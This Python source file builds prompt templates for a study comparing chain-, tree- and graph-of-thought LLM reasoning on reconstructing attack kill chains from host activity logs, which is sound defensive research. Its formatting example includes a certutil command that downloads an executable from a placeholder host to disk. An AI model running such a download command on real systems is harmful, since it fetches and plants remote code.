"""
Phase 4 -- Prompter implementation shared by CoT, ToT, and GoT.

This is the crux of the project's controlled-comparison design: every
prompt template below is used by all three topologies (CoT calls
generate_prompt once on the full evidence; ToT calls it once too, just with
more sampled branches via SamplingParams(n=k); GoT calls it once per
segment, then adds aggregation_prompt and improve_prompt on top). None of
the wording differs by topology -- only which operations are wired together
and how many times each prompt is used, per phases.md's requirement that
reasoning topology is the only variable.
"""

import json
from typing import Dict, List

from graph_of_thoughts.prompter.prompter import Prompter

STAGES = [
    "Initial Access", "Execution", "Persistence", "Privilege Escalation",
    "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
    "Collection", "Command and Control",
]

# Paraphrased from MITRE ATT&CK's own one-line tactic descriptions. Deliberately
# generic: no examples drawn from, or tuned toward, NODLINK's ground-truth
# labeling conventions -- that would be fitting the prompt to the test set.
STAGE_DEFINITIONS = {
    "Initial Access": "the adversary gets its first foothold on the host or network",
    "Execution": "the adversary runs adversary-controlled code",
    "Persistence": "the adversary keeps its foothold across restarts, changed credentials, or other interruptions",
    "Privilege Escalation": "the adversary gains higher-level permissions",
    "Defense Evasion": "the adversary avoids being detected or blocked",
    "Credential Access": "the adversary steals account names, passwords, or other credentials",
    "Discovery": "the adversary learns about the host and network environment",
    "Lateral Movement": "the adversary moves from this host to other systems",
    "Collection": "the adversary gathers data of interest to its goal",
    "Command and Control": "the adversary communicates with compromised systems to control them",
}

# Set by run_grid.py from --prompt-variant. "base" is the prompt every v1
# result was produced with; "stagedefs" adds STAGE_DEFINITIONS. Identical across
# CoT/ToT/GoT either way, so topology stays the only within-variant difference.
PROMPT_VARIANT = "base"


def _stage_block() -> str:
    if PROMPT_VARIANT == "stagedefs":
        defs = "\n".join(f"- {s}: {STAGE_DEFINITIONS[s]}" for s in STAGES)
        return (
            f"{defs}\nChoose the stage by the attacker's goal at that step, not by which tool was used."
        )
    return ", ".join(STAGES)


def task_preamble() -> str:
    return (
        "You are a security analyst investigating a potentially compromised host. "
        "Below is evidence extracted from the host's activity log: process executions, "
        "external network connections, and suspicious file writes, arranged to show which "
        "process spawned which. Identify the events that are part of a malicious attack, and "
        "classify each into exactly one of these kill-chain stages:\n"
        + _stage_block()
        + _TASK_PREAMBLE_TAIL
    )


_TASK_PREAMBLE_TAIL = (
    "\n\nRespond with ONLY a JSON object in this exact shape, nothing else before or after it:\n"
    '{"malicious_events": [{"command": "<the exact command line from the evidence>", '
    '"stage": "<one stage name from the list above>"}, ...], '
    '"narrative": "<a short paragraph describing the attack you reconstructed>"}'
    "\n\nIMPORTANT about the \"command\" field: copy ONLY the quoted command-line text for "
    "that one event -- never the process name, PID, tree indentation, or any child lines "
    "beneath it. For example, given this evidence line:\n"
    '  certutil.exe (PID 3820): "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe"\n'
    'the correct "command" value is exactly: certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe\n'
    "-- not \"certutil.exe (PID 3820): ...\" and not the whole line including surrounding quotes."
)


def _format_reconstruction(state: Dict) -> str:
    return json.dumps(
        {"malicious_events": state.get("malicious_events", []), "narrative": state.get("narrative", "")}
    )


def _links_block(links) -> str:
    # Empty when GoT link hints are off, so the aggregation prompt for every
    # earlier variant stays byte-identical.
    if not links:
        return ""
    listed = "\n".join(f"- {link}" for link in links)
    return (
        "Cross-segment connections found in the evidence structure (each indicator below appears in more "
        "than one segment, so no single segment's analysis could see both ends):\n"
        f"{listed}\n"
        "Events joined through a shared indicator may belong to the same attack even if each looked benign "
        "in its own segment. Use these connections when deciding what to merge, but a connection alone is "
        "not proof of malice.\n\n"
    )


class KillChainPrompter(Prompter):
    def generate_prompt(self, num_branches: int, **kwargs) -> str:
        evidence_text = kwargs["evidence_text"]
        return (
            f"{task_preamble()}\n\nEvidence:\n{evidence_text}\n\n"
            "Reason step by step about which events are malicious and why, then output only the JSON object."
        )

    def aggregation_prompt(self, state_dicts: List[Dict], **kwargs) -> str:
        segments = "\n\n".join(
            f"--- Segment {i + 1} findings ---\n{_format_reconstruction(s)}" for i, s in enumerate(state_dicts)
        )
        return (
            f"{task_preamble()}\n\nThe evidence was split into {len(state_dicts)} segments and reasoned about "
            f"independently, without visibility into the other segments. Here are the findings from each:\n\n"
            f"{segments}\n\n"
            + _links_block(kwargs.get("links"))
            + "Merge these independent findings into ONE combined, correctly ordered kill chain. In particular, "
            "look for events that individually seemed uncertain or low-confidence in their own segment but "
            "become clearly part of the same attack once connected to events in another segment. "
            "Output only the merged JSON object."
        )

    def improve_prompt(self, **kwargs) -> str:
        evidence_text = kwargs["evidence_text"]
        current = _format_reconstruction(kwargs)
        return (
            f"{task_preamble()}\n\nFull evidence:\n{evidence_text}\n\n"
            f"Your current reconstructed kill chain:\n{current}\n\n"
            "Review this once more against the full evidence. Fix any missed events, wrong stage labels, or "
            "events that don't actually belong. Output a revised JSON object in the same shape -- if it is "
            "already correct, output it unchanged."
        )

    def validation_prompt(self, **kwargs) -> str:
        # Unused: no ValidateAndImprove operation in this project's CoT/ToT/GoT
        # graphs. Implemented only because Prompter is an abstract base class.
        raise NotImplementedError("validation_prompt is not used by this project's reasoning methods")

    def score_prompt(self, state_dicts: List[Dict], **kwargs) -> str:
        # Unused: ToT's Score operation is called with a scoring_function
        # callable (see methods/tot.py), which bypasses prompter.score_prompt
        # entirely per graph_of_thoughts' own Score._execute logic.
        raise NotImplementedError("score_prompt is not used -- ToT scores via a scoring_function callable")
